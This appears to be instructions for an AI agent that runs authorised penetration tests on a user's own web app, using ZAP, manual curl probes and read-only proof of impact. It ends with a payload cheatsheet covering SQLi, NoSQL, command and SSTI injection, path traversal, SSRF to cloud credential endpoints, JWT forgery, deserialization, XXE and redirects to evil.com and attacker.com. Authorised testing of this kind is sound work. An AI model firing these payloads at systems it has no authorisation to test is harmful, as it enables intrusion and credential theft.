# Runtime validation — hand your attack vectors to ZAP, then probe by hand

Runs **last**, and only if the user opted into runtime testing against a target
they own. It turns "likely vulnerable (from code)" into "confirmed against the
running app". Two parts plus a payload cheatsheet.

Only ever test the single URL the user named. Local hosts only unless the user
explicitly authorised a remote host they own. `validate_target` refuses while a
static scan is still running — that's intended; finish the scan and your code
triage first.

## Part 1 — drive ZAP with everything you found

This is the point of doing recon and code review first: you now hand ZAP the
exact surface that matters instead of letting it scan blind.

**Run ZAP — do not talk yourself out of it.** When runtime was requested, the ZAP
pass is part of the job, not optional. It is a background job (you keep working
while it runs), and because you seed it with your own vectors + auth (below) it
targets exactly your flagged requests — it is **not** the blind, unauthenticated
crawl you may be picturing. Manual probes (Part 2) go **on top of** ZAP, never
**instead of** it: ZAP fuzzes hundreds of payload variants per parameter far
faster than you can by hand and catches injection variants your manual proof
skipped, while your manual probes catch the auth/logic bugs ZAP can't. Skipping
ZAP because "manual is more precise" or "avoids ZAP's footprint" throws away that
automated coverage — don't. The only acceptable reasons ZAP does not run are the
genuine tool failures below (image missing / target unreachable / it errored),
which you report in the "Runtime validation" line, never route around silently.

    validate_target(target_url, endpoints, tech, auth_headers)

- `endpoints` — **every** vector you flagged: the ones with a data-flow trace to
  a sink, every IDOR/BOLA candidate, and every high-value/state-changing route.
  Each is replayed as a real request, so give the method and body, not just the
  path — a bare GET of a `POST` route sends no body and the injection scanners
  have nothing to fuzz. Use a string for a simple GET (`"/api/users/:id"`) and a
  dict for anything with a body or query:

      [
        "GET /api/users/:id",
        {"method": "POST", "path": "/api/login",
         "body": {"email": "a@b.c", "password": "x"}, "content_type": "json"},
        {"method": "POST", "path": "/api/orders",
         "body": {"total": 1, "items": [{"id": 1, "qty": 1}]}}
      ]

  Route params (`:id`, `{id}`) are auto-filled to a concrete value. This is
  exactly the endpoint table from your recon output block.
- `tech` — the stack fingerprint from recon (e.g. `["Db.PostgreSQL",
  "Language.JavaScript"]`) so ZAP skips irrelevant payload families and finishes
  faster.
- `auth_headers` — attach a session so authenticated routes aren't all 401.
  `{"Authorization": "Bearer <token>"}` or `{"Cookie": "session=<id>"}`, from a
  **throwaway/test account** you created. Without this, ZAP only reaches the
  pre-auth surface. Values are used in-process only, never saved.

Returns a background `job_id` immediately. Poll `validation_status(job_id)` while
it's running or stopping; continue useful work between polls. Read all alert
pages (`offset`) when `truncated` is true. Only `complete` means the full job
finished; `partial`/`failed`/`cancelled`/`interrupted` are coverage gaps. Call
`stop_validation` when done.

**Evidence before confidence.** A SQL error demonstrates an error path, not a
UNION dump. A 302 after a URL submission does not prove the server fetched it. A
zero-alert run is not proof of security — check auth, params, request bodies, and
spider coverage first, and record stalled rules as gaps.

**Correlate every alert back to code:**
- alert matches a static trace on the same endpoint/param → "Static + runtime
  confirmed" = HIGH, strongest confidence.
- alert with **no** matching static finding → investigate: a real bug SAST missed
  (read that endpoint now) or a false positive (verify by hand).
- static finding ZAP didn't trigger → still valid if the trace is sound; note
  "Static only; runtime not reproduced (auth required / not reachable)".

Drop ZAP noise: clickjacking/CSP on JSON APIs, timestamp disclosure, dev-server
header noise, error-reporting DSNs.

## Part 2 — manual probes ZAP is weak at

ZAP is poor at auth logic and object-level authz. Run these by hand (curl), one
request at a time, non-destructive, stop at first proof:

- **Broken access control (highest yield).** Every protected endpoint sent with
  no `Authorization` header → 200 instead of 401/403 = broken auth. Header
  bypass (`X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`); path
  normalization (`/admin/`, `/admin//`, `/admin/./`, `/admin%20`, `/ADMIN`);
  method tunneling (GET on a POST-only route, `X-HTTP-Method-Override`).
- **IDOR / BOLA.** Swap the id in path/body for one you don't own (adjacent id or
  one from a listing endpoint) → 200 with another owner's record = confirmed. Try
  horizontal and vertical. Body-level foreign `orgId`/`tenantId`; header-forged
  `x-tenant-id`.
- **Auth abuse.** 20 parallel POSTs to login/reset/OTP (`for i in $(seq 20); do
  curl … & done; wait`) — no 429 = missing rate limit; test `X-Forwarded-For`
  rotation. Mass assignment: extra `role|isAdmin|verified|permissions`. Webhook
  signature: none, wrong-but-valid-format, replayed.
- **Authz matrix (≥2 roles).** Build an endpoints × roles table; flag any cell
  that succeeded when it shouldn't. Catches vertical privilege escalation.
- **Business-logic probes** (scriptable, neither SAST nor ZAP finds them):
  negative/overflow amounts on cart/transfer/top-up (check the server's own math,
  not the UI); coupon reuse/stacking; client-trusted price/total resent altered;
  WebSocket/Socket.io privileged events emitted without a token. Read-mostly —
  create throwaway state, never complete a real payment. Playwright drives
  UI-only flows (multi-step checkout, hash-route admin views): log in, reach the
  state, tamper via `page.route(...)`, assert on the response.

## Part 3 — prove impact (read-only, smallest possible)

Live proofs are **read-only and non-destructive — a hard rule.** You are
scanning someone's running system. Never modify data at scale, change/reset
credentials, delete/overwrite files, drop tables, or run a destructive command.
Pull the smallest read that shows impact:

- SQL/NoSQL injection → a read returning rows you shouldn't see
  (`' UNION SELECT version()--`, then ONE `LIMIT 1` row), never a mass `$set`/UPDATE.
- IDOR → one other owner's object (one record), record both ids + one field.
- SSRF → cloud metadata endpoint or `file:///etc/passwd`.
- Path traversal → `/etc/passwd`, then stop.
- RCE / eval → a read-only expression (print the runtime version), never a
  state-changing command.
- Auth bypass / account takeover → one admin-only endpoint, or demonstrate the
  missing check on a throwaway account you created — never change a real user's
  password.
- DoS / resource exhaustion (ReDoS, `$where`/eval hang, decompression bomb,
  unbounded query) → do **not** prove it by taking the target down. Availability
  is impact, so crashing or hanging the instance is a destructive side effect,
  not an acceptable proof. Confirm it from the code (the unbounded/eval sink with
  no guard) and mark it "Confirmed in code"; at most, one single controlled
  observation (e.g. a request that returns measurably slower) is the ceiling —
  and if the target does go down, **stop, disclose it, and never repeat the
  probe to "re-confirm."** Report the finding either way; a code-only DoS is a
  complete finding.

Sample ≤1 row/file. Redact PII and secrets (`a***@e***.com`, `sk_live_****1234`).
On production, stop at "reachable" proof (`SELECT version()`, a 200 where a 401
belonged). If the only proof is destructive, **don't** — mark "Confirmed in code"
and describe the PoC. If you caused any side effect, disclose it at the top of
the report.

Prove the top tier: when a target is available, every CRITICAL/HIGH-class
candidate (SQL/NoSQL injection, auth bypass, JWT forgery, XXE, RCE, SSRF, IDOR)
should get a live read-only PoC attempt, not just a code trace. State plainly per
finding whether it was executed live ("Confirmed exploitable") or only read
("Confirmed in code", with one line on what a live PoC would need).

---

## Payload cheatsheet (smallest probe that proves the class)

Record the exact request + response + verdict; never run destructive variants.

- **SQLi** — detect `' OR '1'='1`, `1' AND SLEEP(3)--`; proof `' UNION SELECT
  version()--` then one `LIMIT 1` row; Postgres `';SELECT pg_sleep(3)--`.
- **NoSQL (Mongo)** — bypass `{"email":"a@b.c","password":{"$ne":null}}`,
  `{"username":{"$gt":""},"password":{"$gt":""}}`; time `{"$where":"sleep(3000)||true"}`.
- **Command / code** — `; id`, `| id`, `$(id)`; Node eval →
  `require('child_process').execSync('id')`.
- **Path traversal / LFI** — `../../../../etc/passwd`, `..%2f`, `....//`, `%00`;
  on confirm read `.env`, then stop.
- **SSRF** — `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
  `http://metadata.google.internal/` (`Metadata-Flavor: Google`); parser
  differentials `http://127.0.0.1@evil.com`, `http://127.1`, `http://[::1]`.
- **JWT** — `alg=none`; RS256→HS256 confusion (sign with the public key as HMAC
  secret); weak HS256 secret brute-force offline; `kid` path-traversal/SQLi.
- **SSTI** — `{{7*7}}` / `${7*7}` / `#{7*7}` → 49; engine RCE via Handlebars
  `constructor.constructor`, Jinja2 `{{''.__class__.__mro__[1].__subclasses__()}}`,
  EJS `<%= process.mainModule.require('child_process').execSync('id') %>`.
- **Prototype pollution** — `{"__proto__":{"isAdmin":true}}`,
  `?__proto__[isAdmin]=true`; check persistence across requests.
- **Deserialization** — node-serialize
  `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`;
  unsafe YAML `!!js/function`, `!!python/object/apply:os.system ['id']`.
- **OAuth redirect_uri** — `https://allowed.com.attacker.com`,
  `https://allowed.com@attacker.com`, `https://allowed.com/../attacker`,
  `javascript:`/`data:`; plus `state` omitted/reused, PKCE→`plain`,
  `response_type` switched, OIDC `nonce` omitted.
- **XXE** — `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`;
  blind/OOB via external DTD.
- **Open redirect** — `//evil.com`, `/\evil.com`, `https:evil.com`,
  `https://trusted@evil.com`.
- **Race condition** — 10–20 concurrent identical requests (`& wait`) at a
  check-then-act flow (balance deduct, coupon redeem, unique-constraint create).

Prefer the least-invasive probe. On production, stop at "reachable" rather than
extracting real data. Redact everything sensitive in the write-up.
